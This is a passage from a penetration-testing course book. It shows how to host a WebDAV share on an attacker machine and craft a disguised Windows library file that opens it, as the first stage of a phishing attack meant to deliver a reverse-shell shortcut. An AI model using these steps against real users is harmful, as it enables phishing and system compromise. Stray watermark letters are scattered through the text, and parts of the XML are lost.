In this section, we’ll leverage a two-stage client-side attack. In the first stage, we’ll use Windows
library files to gain a foothold on the target system and set up the second stage. In the second
512 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/DeployOffice/security/plan-security-settings-for-vba-macros-
in-office
513 (Microsoft Documentation, 2018), https://docs.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-
objects
514 (Microsoft Documentation, 2022), https://www.microsoft.com/en-us/download/details.aspx?id=49030
515 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/client-management/windows-libraries
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 338
Made in Morocco
Penetration Testing with Kali Linux
stage, we’ll use the foothold to provide an executable file that will start a reverse shell when
double-clicked.
First, we’ll create a Windows library file connecting to a WebDAV516 share we’ll set up. In the first
stage, the victim receives a .Library-ms file, perhaps via email. When they double-click the file, it
will appear as a regular directory in Windows Explorer. In the WebDAV directory, we’ll provide a
payload in the form of a .lnk shortcut file for the second stage to execute a PowerShell reverse
shell. We must convince the user to double-click our .lnk payload file to execute it.
At first glance, it may seem that we could accomplish this by serving the .lnk file for the second
stage with a web server like Apache. The disadvantage is that we would need to provide our web
link to the victim (again, perhaps by email). Most spam filters and security technologies analyze
the contents of a link for suspicious content or executable file types to download. This means
that our links may be filtered before even reaching the victim.
y
On the other hand, a majority of spam filters and security technologies will pass Windows library
files directly to the user. When they double-click the file, Windows Explorer displays the contents
k
of the remote location as if it were a local directory. In this case, the remote location is a WebDAV
share on our attack machine. Overall, this is a relatively straightforward process and makes it
seem as if the user is double-clicking a local file. s
To demonstrate this, we’ll first set up a WebDAV share on our Kali system. We’ll use WsgiDAV517
o
as the WebDAV server to host and serve our files. We can use pip3 to install WsgiDAV.
kali@kali:~$ pip3 install wsgidav n
Defaulting to user installation because normal site-packages is not writeable
Collecting wsgidav
Downloading WsgiDAV-4.0.1-py3-inone-any.whl (171 kB)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 171.3/171.3 KB 1.6 MB/s eta 0:00:00
z
...
Successfully installed json5-0.9.6 wsgidav-4.0.1
D Listing 220 - Installing pip3 and WsgiDAV
Once WsgiDAV is installed, we’ll create the /home/kali/webdav directory to use as the WebDAV
share that will contain our .lnk file. For now, let’s place a test.txt file in this directory.
If the installation of WsgiDAV fails with error: externally-managed-environment,
you can add –break-system-packages to the install command. In PEP 668,518 a
change was introduced to enforce the use of virtual environments519 and prevent
situations in which package installations via pip break the operating system.
Next, we’ll run WsgiDAV from the /home/kali/.local/bin directory. The first parameter we’ll provide
is –host, which specifies the host to serve from. We’ll listen on all interfaces with 0.0.0.0. Next,
we’ll specify the listening port with --port=80 and disable authentication to our share with --
516 (Wikipedia, 2022), https://en.wikipedia.org/wiki/WebDAV
517 (WsgiDAV Documentation, 2022), https://wsgidav.readthedocs.io/en/latest/index.html
518 (Python Enhancement Proposals, 2021), https://peps.python.org/pep-0668/
519 (Python3 Docs, 2023), https://docs.python.org/3/library/venv.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 339
Made in Morocco
Penetration Testing with Kali Linux
auth=anonymous. Finally, we’ll set the root of the directory of our WebDAV share with --root
/home/kali/webdav/.
kali@kali:~$ mkdir /home/kali/webdav
kali@kali:~$ touch /home/kali/webdav/test.txt
kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous -
-root /home/kali/webdav/
Running without configuration file.
17:41:53.917 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True:
skipping.
17:41:53.919 - INFO : WsgiDAV/4.0.1 Python/3.9.10 Linux-5.15.0-kali3-amd64-x86_64-
with-glibc2.33
17:41:53.919 - INFO : Lock manager: LockManager(LockStorageDict)
17:41:53.919 - INFO : Property manager: None y
17:41:53.919 - INFO : Domain controller: SimpleDomainController()
17:41:53.919 - INFO : Registered DAV providers by route:
k
17:41:53.919 - INFO : - '/:dir_browser': FilesystemProvider for path
'/home/kali/.local/lib/python3.9/site-packages/wsgidav/dir_browser/htdocs' (Read-Only)
(anonymous)
s
17:41:53.919 - INFO : - '/': FilesystemProvider for path '/home/kali/webdav'
(Read-Write) (anonymous)
17:41:53.920 - WARNING : Basic authenticationo is enabled: It is highly recommended to
enable SSL.
17:41:53.920 - WARNING : Share '/' will allow anonymous write access.
17:41:53.920 - WARNING : Share '/:dir_bnrowser' will allow anonymous read access.
17:41:54.348 - INFO : Running WsgiDAV/4.0.1 Cheroot/8.5.2+ds1 Python 3.9.10
17:41:54.348 - INFO : Serving on http://0.0.0.0:80 ..
i
Listing 221 - Starting WsgiDAV on port 80
z
The output indicates that the WebDAV server is now running on port 80. Let’s confirm this by
opening http://127.0.0.1 in our browser.
D
Figure 188: Contents of WebDAV share
Figure 188 shows that we could successfully browse to the WebDAV share and view test.txt.
Next, let’s create the Windows library file. We’ll use xfreerdp to connect to the CLIENT137
machine at 192.168.50.194 via RDP to prepare our attack. We can connect to the system with
offsec as the username and lab as the password. This will make it a lot easier for us to build and
test our library file, and later, our shortcut file.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 340
Made in Morocco
Penetration Testing with Kali Linux
Once connected, we’ll find the Visual Studio Code (VSC)520 application on the desktop, which we’ll
use to create our library file. We should note that we could also use Notepad to create the file.
Let’s open VSC by double-clicking the icon.
y
k
Figure 189: Windows 11 Desktop
s
In the menu bar, we’ll click on File > New Text File. We’ll then save the empty file as config.Library-
ms on the offsec user’s desktop. As soon as we save the file with this file extension, it is displayed
o
with an icon. While the icon doesn’t look dangerous, it is not commonly used by Windows and
therefore may raise suspicions. To increase the chances that our victim will execute our file, let’s
change its appearance. n
i
z
D
Figure 190: Empty Windows Library file
Library files consist of three major parts and are written in XML to specify the parameters for
accessing remote locations. The parts are General library information, Library properties, and
Library locations. Let’s build the XML code by adding and explain the tags. We can refer to the
520 (Visual Studio, 2022), https://code.visualstudio.com/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 341
Made in Morocco
Penetration Testing with Kali Linux
Library Description Schema521 for further information. We’ll begin by adding the XML and library
file’s format version.
The listing below contains the namespace522 for the library file. This is the namespace for the
version of the library file format starting from Windows 7. The listing also contains the closing tag
for the library description. All of the following tags we cover will be added inside the
libraryDescription523 tags.
Listing 222 - XML and Library Description Version
Next, we’ll add two tags providing information about the library. The name524 tag specifies the
y
name of this library. We must not confuse this with an arbitrary name we can just set randomly.
We need to specify the name of the library by providing a DLL name and index. We can use
@shell32.dll,-34575 or @windows.storage.dll,-34582 as specifiked on the Microsoft website. We’ll
use the latter to avoid any issues with text-based filters that may flag on “shell32”. The version525
tag can be set to a numerical value of our choice, for example, 6.
s
@windows.storage.dll,-34582
6 o
Listing 223 - Name and Version Tags of the Library
Next, we’ll add the isLibraryPinned526 tag. nThis element specifies if the library is pinned to the
navigation pane in Windows Explorer. For our targets, this may be another small detail to make
the whole process feel more genuine and therefore, we’ll set it to true. The next tag we’ll add is
i
iconReference,527 which determines what icon is used to display the library file. We must specify
z
the value in the same format as the name element. We can use imagesres.dll to choose between
all Windows icons. We can use index “-1002” for the Documents folder icon from the user home
directories or “-1003” for thDe Pictures folder icon. We’ll provide the latter to make it look more
benign.
true
imageres.dll,-1003
Listing 224 - Configuration for Navigation Bar Pinning and Icon
Now, let’s add the templateInfo528 tags, which contain the folderType529 tags. These tags
determine the columns and details that appear in Windows Explorer by default after opening the
521 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/win32/shell/library-schema-entry
522 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/win32/shell/library-schema-entry#namespace-
versioning
523 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell/schema-librarydescription
524 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-name
525 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-version
526 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-islibrarypinned
527 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-iconreference
528 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-templateinfo
529 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-foldertype
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 342
Made in Morocco
Penetration Testing with Kali Linux
library. We’ll need to specify a GUID that we can look up on the Microsoft documentation530
webpage. For this example, we’ll use the Documents GUID to appear as convincing as possible
for the victim.
{7d49d726-3c21-4f05-99aa-fdc2c9474656}
Listing 225 - templateInfo and folderType tags
The next tag marks the beginning of the library locations section. In this section, we specify the
storage location where our library file should point to. We’ll begin by creating the
searchConnectorDescriptionList,531 tag which contains a list of search connectors532 defined by
searchConnectorDescription.533 Search connectors are used by library files to specify the
connection settings to a remote location. We can specify one or more
searchConnectorDescription elements inside the searchConnectorDescriptionList tags. For this
y
example we only specify one.
Inside the description of the search connector, we’ll specify inkformation and parameters for our
WebDAV share. The first tag we’ll add is the isDefaultSaveLocation534 tag with the value set to
true. This tag determines the behavior of Windows Explosrer when a user chooses to save an item.
To use the default behavior and location, we’ll set it to true. Next, we’ll add the isSupported tag,
which is not documented in the Microsoft Documentation webpage, and is used for compatibility.
o
We can set it to false.
The most important tag is url,535 which we need to point to our previously-created WebDAV share
n
over HTTP. It is contained within the simpleLocation536 tags, which we can use to specify the
remote location in a more user-friendly way as the normal locationProvider537 element.
i
true
D
false
http://192.168.119.2
Listing 226 - templateInfo and folderType tags
530 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-foldertype
531 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-
searchconnectordescriptionlist
532 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry
533 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-
searchconnectordescription
534 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/win32/search/search-schema-sconn-
isdefaultsavelocation
535 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/search/search-schema-sconn-url
536 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/search/search-schema-sconn-
simplelocation
537 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/search/search-schema-sconn-
locationprovider
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 343
Made in Morocco
Penetration Testing with Kali Linux
Let’s paste the code into Visual Studio Code.
We have just reviewed the XML code for all of the sections of our library File. We now have a
basic understanding of the inner workings of library files and can customize them to fit our needs.
The following listing shows the entire XML:
@windows.storage.dll,-34582
6
true
imageres.dll,-1003
{7d49d726-3c21-4f05-99aa-fdc2c9474656}
 y
true
k
false
http://192.168.119.2 s
 o
Listing 227 - Windows Library code for connecting to our WebDAV Share
n
Let’s save and close the file in Visual Studio Code. We’ll then double-click the config.Library-ms
file on the Desktop.
i
z
D
Figure 191: Double-Clicking the Windows Library file
When we open the directory in Explorer, we find the previously-created test.txt file we placed in
the WebDAV share. Therefore, the library file works and embeds the connection to the WebDAV
share.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 344
Made in Morocco
Penetration Testing with Kali Linux
Very nice!
As an added bonus, the path in the navigation bar only shows config without any indication that
this is actually a remote location. This makes it a perfect first stage for our client-side attack.
When we re-open our file in Visual Studio Code, we find that a new tag appeared named
serialized.538 The tag contains base64-encoded information about the location of the url tag.
Additionally, the content inside the url tags has changed from http://192.168.119.2 to
\\192.168.119.2\DavWWWRoot. Windows tries to optimize the WebDAV connection information
for the Windows WebDAV client539 and therefore modifies it.
y
k
s
o
n
i
z
Figure 192: Modified XML code of config.Library-ms
D
The library file still works when we double-click it, but due to the encoded information in the
serialized tag, it may not be working on other machines or after a restart. This could result in a
situation where our client-side attack fails, because Windows Explorer shows an empty WebDAV
share.
To avoid running into any issues when performing this attack, we can reset the file to its original
state by pasting the contents of listing 227 into Visual Studio Code. Unfortunately, we need to do
this every time we execute the Windows library file. However, this is not a big deal since in most
assessments we only need the victim to double-click the file once. Once the file has returned to
its original state, we are ready to send the file to our victim.
Now that we have a working Windows library file, we’ll need to create the shortcut file. The goal is
to start a reverse shell by putting the .lnk shortcut file on the WebDAV share for the victim to
execute.
538 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/search/search-schema-sconn-
simplelocation
539 (WebDav SYSTEM, 2022), https://www.webdavsystem.com/server/access/windows
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 345